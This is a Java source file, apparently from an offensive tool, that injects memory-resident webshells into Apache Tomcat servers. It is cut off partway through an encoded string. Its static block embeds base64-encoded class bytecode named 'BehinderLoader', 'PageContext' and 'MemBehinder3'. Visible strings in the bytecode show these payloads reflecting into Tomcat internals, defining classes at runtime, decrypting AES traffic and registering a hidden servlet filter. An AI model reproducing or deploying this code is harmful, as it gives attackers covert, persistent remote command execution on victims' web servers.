package core;

import common.CommonUtils;
import common.HttpUtils;
import common.PayloadEncrypt;
import entity.ControllersFactory;
import payloads.echo.TomcatEcho;
import payloads.util.Serializer;
import sun.misc.BASE64Decoder;
import ui.MyController;

import javax.servlet.jsp.PageContext;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.util.List;
import java.util.Map;

public class MemInject {

    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;
    final private Map<String,byte[]> loaderByte = ControllersFactory.loaderByte;
    final private Map<String,Class> successGadget = ControllersFactory.successGadget;
    private static Map<String,String> memShellLoader = ControllersFactory.memShellLoader;
    private HttpUtils httpUtils = new HttpUtils();
    public PageContext pageContext;

    static {
        memShellLoader.put("BehinderLoader", "yv66vgAAADQAzwoAPQBaCgADAFsHAFwKACsAXQcAXgoAKwBfCgBgAGEKAGAAYgoABQBjCgBkAGUKAGQAZggAZwoAMABoBwBpCgBkAGoIAGsKAGwAbQgAbggAbwcAcAgAcQgAcggAcwoABQB0CAB1BwB2CwAaAHcLABoAeAcAeQgAegcAewoAHwB8BwB9CgAhAH4KACEAfwgAgAoAIQCBBwCCCgAmAFoKACYAgwcAhAgAhQcAhgcAhwkAMgCICgArAIkKAIoAYQcAiwoAKwCMBwCNCgAyAI4KAIoAjwgAkAoAKwCRBwCSBwCTCgCUAJUKAAMAlgcAlwoAOwB0BwCYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACGdldEZpZWxkAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA1TdGFja01hcFRhYmxlBwCZBwCGBwBeAQAKRXhjZXB0aW9ucwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAmgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgcAmwcAnAcAXAcAdgcAeQcAewcAfQcAnQcAngcAlwEAClNvdXJjZUZpbGUBABNCZWhpbmRlckxvYWRlci5qYXZhDAA+AD8MAJ8AoAEAEGphdmEvbGFuZy9PYmplY3QMAKEAogEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwAowCgBwCZDACkAKUMAKYApwwAPgCoBwCbDACpAKoMAKsArAEAB3RocmVhZHMMAEIAQwEAE1tMamF2YS9sYW5nL1RocmVhZDsMAK0ArgEABGV4ZWMHAJwMAK8AsAEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsDACxAD8BAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMALIAswwApgC0AQAdb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdEluZm8BAANyZXEBABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DAC1ALQBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0DAC2ALcMALgAuQEACmNsYXNzRGF0YTEMALoAuwEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMALwAvQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQACW0IMAL4AvwwAwADBBwDCAQAOQmVoaW5kZXJMb2FkZXIMAMMAxAEAEWphdmEvbGFuZy9JbnRlZ2VyDAA+AMUMAMYAxwEACmNsYXNzRGF0YTIMAMgAyQEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQcAygwAywDMDADNAM4BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEAEGphdmEvbGFuZy9TdHJpbmcBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAPcHJpbnRTdGFja1RyYWNlAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5vdGUBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAEKEkpVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgAhADAAPQAAAAAABQABAD4APwABAEAAAAAdAAEAAQAAAAUqtwABsQAAAAEAQQAAAAYAAQAAAAkACQBCAEMAAgBAAAAAmwADAAUAAAA4AU0qtgACTi0SA6UAFi0rtgAETacADToELbYABk6n/+osxgAOLAS2AAcsKrYACLC7AAVZK7cACb8AAQANABMAFgAFAAIAQQAAADIADAAAAEgAAgBJAAcASwANAE0AEwBOABYATwAYAFAAHQBRACAAVQAkAFYAKQBXAC8AWQBEAAAAEQAE/QAHBwBFBwBGTgcARwkOAEgAAAAEAAEAOwABAEkASgACAEAAAAAZAAAAAwAAAAGxAAAAAQBBAAAABgABAAAAYABIAAAABAABAEsAAQBJAEwAAgBAAAAAGQAAAAQAAAABsQAAAAEAQQAAAAYAAQAAAGUASAAAAAQAAQBLAAgATQA/AAEAQAAAA5UACQAVAAACMwM7uAAKtgALEgy4AA3AAA7AAA5MAz0cK76iAhErHDJOLcYB/C22AA86BBkEEhC2ABGaAewZBBIStgARmQHiLRITuAANOgUBOgYZBcEAFJkAIBkFEhW4AA0SFrgADRIXuAANOganAAo6BxkHtgAYGQbGAa0ZBhIZuAANwAAaOgcDPRwZB7kAGwEAogGUGQccuQAcAgDAAB06CBkIEh64AA3AAB86CRkJBLYAIMAAIToKGQq2ACI6CxkKtgAjOgwZChIktgAlOg27ACZZtwAnGQ22ACg6DhIpEioGvQArWQMSLFNZBLIALVNZBbIALVO2AC46DxkPBLYALxkPEjC2ADEGvQADWQMZDlNZBLsAMlkDtwAzU1kFuwAyWRkOvrcAM1O2ADTAACs6EBkKEjW2ACU6EbsAJlm3ACcZEbYAKDoSEikSKga9ACtZAxIsU1kEsgAtU1kFsgAtU7YALjoTGRMEtgAvGRMSMLYAMQa9AANZAxkSU1kEuwAyWQO3ADNTWQW7ADJZGRK+twAzU7YANMAAKzoUGRQEvQArWQMZEFO2ADYEvQADWQMZEAW9ACtZAxI3U1kEEjhTtgA2Bb0AA1kDGQpTWQQZC1O2ADlTtgA5B70AA1kDGQpTWQQZC1NZBRkMU1kGGRAFvQArWQMSN1NZBBI4U7YANgW9AANZAxkKU1kEGQtTtgA5U7YAOlenAAo6DRkNtgA8BDunAAMamQAGpwAJhAIBp/3vpwAISyq2ADyxAAMAUQBkAGcABQC+Ag4CEQA7AAACKgItADsAAgBBAAAAvgAvAAAADQACAA4AFAAPABwAEAAgABEAJAASACoAEwA+ABQARgAVAEkAFgBRABgAZAAbAGcAGQBpABoAbgAdAHMAHgB/AB8AjAAgAJkAIQClACIAsAAjALcAJAC+ACYAxwAnANUAKADzACkA+QAqASkAKwEyACwBQAAtAV4ALgFkAC8BlAAxAbgAMgH1ADMCDgA2AhEANAITADUCGAA3AhoAOAIdAD0CIQA+AiQADwIqAEMCLQBBAi4AQgIyAEQARAAAAHQAC/4AFgEHAA4B/wBQAAcBBwAOAQcATgcATwcAUAcAUAABBwBHBvwAEgcAUf8BjwANAQcADgEHAE4HAE8HAFAHAFAHAFEHAFIHAFMHAFQHAFUHAFYAAQcAVwb/AAQABAEHAA4BBwBOAAD6AAb4AAVCBwBXBAABAFgAAAACAFk=");
        memShellLoader.put("PageContext","yv66vgAAADQAMwoACAApCQAHACoJAAcAKwcALAsABAAtCgAIAC4HAC8HADABAAdyZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAGZ2V0T3V0AQASKClMamF2YS9pby9Xcml0ZXI7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9MamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQ7AQAGPGluaXQ%2BAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAEE1ldGhvZFBhcmFtZXRlcnMBAAMoKVYBAApzZXRSZXF1ZXN0AQAhKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OylWAQALc2V0UmVzcG9uc2UBACIoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAR0ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAFiAQACW0IBAApTb3VyY2VGaWxlAQAQUGFnZUNvbnRleHQuamF2YQwAFAAXDAAJAAoMAAsADAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMABwAHQwAMQAyAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEABwAIAAAAAgAAAAkACgAAAAAACwAMAAAACQABAA0ADgABAA8AAAAsAAEAAQAAAAIBsAAAAAIAEAAAAAYAAQAAABEAEQAAAAwAAQAAAAIAEgATAAAAAQAUABUAAgAPAAAAWQACAAMAAAAPKrcAASortQACKiy1AAOxAAAAAgAQAAAAEgAEAAAAFAAEABUACQAWAA4AFwARAAAAIAADAAAADwASABMAAAAAAA8ACQAKAAEAAAAPAAsADAACABYAAAAJAgAJAAAACwAAAAEAFAAXAAEADwAAADMAAQABAAAABSq3AAGxAAAAAgAQAAAACgACAAAAGQAEABsAEQAAAAwAAQAAAAUAEgATAAAAAQAYABkAAgAPAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAQAAAACgACAAAAHgAFAB8AEQAAABYAAgAAAAYAEgATAAAAAAAGAAkACgABABYAAAAFAQAJAAAAAQAaABsAAgAPAAAAPgACAAIAAAAGKiu1AAOxAAAAAgAQAAAACgACAAAAIgAFACMAEQAAABYAAgAAAAYAEgATAAAAAAAGAAsADAABABYAAAAFAQALAAAAAQAcAB0AAQAPAAAARwABAAIAAAAPKrQAAsAABEwruQAFAQCwAAAAAgAQAAAACgACAAAAJgAIACcAEQAAABYAAgAAAA8AEgATAAAACAAHAB4AHwABAAEAIAAhAAEADwAAAC8AAQABAAAABSq0AAKwAAAAAgAQAAAABgABAAAALAARAAAADAABAAAABQASABMAAAABACIAIwABAA8AAAAvAAEAAQAAAAUqtAADsAAAAAIAEAAAAAYAAQAAADEAEQAAAAwAAQAAAAUAEgATAAAAAQAeACQAAgAPAAAAPQAEAAIAAAAJKisDK763AAawAAAAAgAQAAAABgABAAAANQARAAAAFgACAAAACQASABMAAAAAAAkAJQAmAAEAFgAAAAUBACUAAAABACcAAAACACg%3D");
        memShellLoader.put("MemBehinder3", "yv66vgAAADQBZAoAMQCSCQA9AJMJAD0AlAcAlQcAlgsABACXCABmCwAEAJgLAAQAmQgAmgoAXgCbCACcCACdCwAFAJ4KAD0AnwgAoAsAOwChCgA8AKIKADwAowgApAoApQCmBwCnBwCoCgAXAJILADsAqQoAFwCqCACrCgAXAKwKABcArQoAXgCuCgAWAK8KAKUAsAsABACxCgCyALMIALQKACYAtQgAtgcAtwcAuAkAMgC5CgAmALoKALsAvAcAvQoAKwCSCgArAL4KAKUAvwoAMQDACgAmAMEHAMIHAMMKADIAxAoAuwDFCgAmAMYKADEAmwcAxwsAyADJBwDKBwDLBwDMBwDNBwDOCgA9AM8IANAIANEKAD0A0gcA0woAQgDUCADVCgDWANcKAF4A2AoA1gDZBwDaCgDWANsKAEgA3AoASADdCgBeAN4KAF4A3woAXgDgCwAEAOELAOIA4wgA5AoAJgDlCgDmALwKAOYA5wcA6AcA6QcA6ggA6wkA7ADtCgDmAO4LAOIA7wkA8ADxCgDyAPMHAPQLAPUA9ggA9woAJgD4CQDsAPkHAPoBAAtwYWdlQ29udGV4dAEAH0xqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDsBAARwYXNzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ%2BAQAiKExqYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dDspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEACkV4Y2VwdGlvbnMHAPsBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA1TdGFja01hcFRhYmxlBwCVBwCWBwDMBwDOBwD8BwD9BwD%2BBwD0BwDHBwD%2FAQAHZGVzdHJveQEAAygpVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgcAwgcAywcAzQcA0wEAA21kNQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQZHluYW1pY0FkZEZpbHRlcgEAZChMamF2YXgvc2VydmxldC9GaWx0ZXI7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7KVYHAPoHAQAHAQEHAOgHAOkHAQQHAQUBAApTb3VyY2VGaWxlAQARTWVtQmVoaW5kZXIzLmphdmEMAGgAfgwAZgBnDABkAGUBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAQYBBwwBCACGDAEJAIYBAAdzdWNjZXNzDAB%2FAIABAAZJbmplY3QBAAdTdWNjZXNzDAEKAQsMAIUAhgEAAXUMAQwBDQwBDgEPDAEQAREBAANBRVMHARIMARMBFAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBFQEWDAEXARgBAAAMARcBGQwBGgEbDAEcAR0MAGgBHgwAbAEfDAEgASEHASIMASMBGwEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwBJAElAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBAAJbQgwBJgEnDAEoASkHASoMASsBLAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAS0BLgwBLwEwDAExATIMATMBNAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvSW50ZWdlcgwAaAE1DAE2ATcMATgBOQEAE2phdmEvbGFuZy9FeGNlcHRpb24HAP4MAHABOgEAE1tMamF2YS9sYW5nL09iamVjdDsBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAHWphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0AQAMTWVtQmVoaW5kZXIzDABoAGkBAAhCZWhpbmRlcgEAAi8qDACHAIgBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgwBOwB%2BAQADTUQ1BwE8DAETAT0MAT4BPwwBQAFBAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAUIBHQwAaAFDDAEaAUQMAUUBGwwBRgFHDAFIARsMAUkBSgcBAAwBSwFMAQAHY29udGV4dAwBTQFOBwEBDAFPAVABACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvdXRpbC9MaWZlY3ljbGVCYXNlAQAFc3RhdGUHAVEMAVIBUwwBVAFVDAFWAVcHAVgMAVkBWgcBWwwBXAFdAQAQamF2YS9sYW5nL1N0cmluZwcBBAwBXwFgAQALZmlsdGVyU3RhcnQMAWEBKQwBYgFTAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAB0R5bmFtaWMBAAxJbm5lckNsYXNzZXMBAChqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljAQATamF2YS9sYW5nL1Rocm93YWJsZQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAJZ2V0SGVhZGVyAQAMZ2V0UGFyYW1ldGVyAQAJc2V0SGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAApzZXRSZXF1ZXN0AQAhKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OylWAQALc2V0UmVzcG9uc2UBACIoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRWYWx1ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABChJKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAD3ByaW50U3RhY2tUcmFjZQEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAVZ2V0RmlsdGVyUmVnaXN0cmF0aW9uAQA2KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb247AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAib3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZQEADVNUQVJUSU5HX1BSRVABACRMb3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZTsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAlhZGRGaWx0ZXIBAFQoTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvRmlsdGVyOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwEAEWphdmEvdXRpbC9FbnVtU2V0AQACb2YBACUoTGphdmEvbGFuZy9FbnVtOylMamF2YS91dGlsL0VudW1TZXQ7BwFjAQAYYWRkTWFwcGluZ0ZvclVybFBhdHRlcm5zAQAqKExqYXZhL3V0aWwvRW51bVNldDtaW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0TWV0aG9kAQAHU1RBUlRFRAEAIGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uACEAPQAxAAEAYwACAAAAZABlAAAAAABmAGcAAAAHAAEAaABpAAEAagAAADMAAgACAAAADyq3AAEqAbUAAiortQADsQAAAAEAawAAABIABAAAABQABAASAAkAFQAOABYAAQBsAG0AAgBqAAAAGQAAAAIAAAABsQAAAAEAawAAAAYAAQAAABoAbgAAAAQAAQBvAAEAcABxAAIAagAAAfIACAAOAAABPSvAAAQ6BCzAAAU6BRkEuQAGAQA6Biq0AALHABAqGQQSB7kACAIAtQACGQQSB7kACQIAEgq2AAuZAPsqtAACxgD0GQUSDBINuQAOAwAqtAACuAAPOgcZBhIQGQe5ABEDACq0AAMrtgASKrQAAyy2ABMSFLgAFToIuwAWWbsAF1m3ABgZBhIQuQAZAgC2ABoSG7YAHLYAHbYAHhIUtwAfOgkZCAUZCbYAIBkEuQAhAQC2ACI6ChIjuAAkEiUGvQAmWQMSJ1NZBLIAKFNZBbIAKFO2ACk6CxkLBLYAKhkIuwArWbcALBkKtgAttgAuOgwZCyq2AC%2B2ADAGvQAxWQMZDFNZBLsAMlkDtwAzU1kFuwAyWRkMvrcAM1O2ADTAACY6DRkNtgA1KrQAA7YANlenAAU6CC0ZBBkFuQA4AwCxAAEAYAEtATAANwACAGsAAABiABgAAAAfAAYAIAAMACEAFQAmABwAJwApACkAQQAqAEwALABVAC0AYAAwAGgAMQBwADIAdwAzAKAANACoADUAtAA2ANUANwDbADgA7gA6ASAAOwEtAD0BMAA8ATIAPwE8AEAAcgAAADMAA%2F4AKQcAcwcAdAcAdf8BBgAIBwB2BwB3BwB4BwB5BwBzBwB0BwB1BwB6AAEHAHv6AAEAbgAAAAYAAgB8AG8AAQB9AH4AAQBqAAAAGQAAAAEAAAABsQAAAAEAawAAAAYAAQAAAEQAAQB%2FAIAAAQBqAAAAsAAEAAgAAABEK8AAOcAAOU0sAzLAAAROLAQywAA6OgQsBTLAADs6BSwGMsAAPDoGuwA9WRkGtwA%2BEj8SQC24AEGnAAo6BxkHtgBDBKwAAQAnADgAOwBCAAIAawAAACoACgAAAEcACABIAA8ASQAXAEoAHwBLACcATQA4AFAAOwBOAD0ATwBCAFEAcgAAACIAAv8AOwAHBwB2BwCBBwA5BwBzBwCCBwB1BwCDAAEHAIQGAAkAhQCGAAEAagAAAIYABAADAAAAOQFMEkS4AEVNLCq2AB4DKrYARrYAR7sASFkELLYASbcAShAQtgBLtgBMTKcABE0rAxAQtgBNtgBOsAABAAIAKgAtADcAAgBrAAAAGgAGAAAAVQACAFgACABZABUAWgAqAFsALgBcAHIAAAATAAL%2FAC0AAgcAegcAegABBwB7AAAJAIcAiAACAGoAAAHdAAcADAAAAOctuQBPAQA6BBkEK7kAUAIAxwDWAToFAToGAToHAToIAToJGQS2AC8SUbYAUjoFGQUEtgBTGQUZBLYAVMAAVToGGQa2AC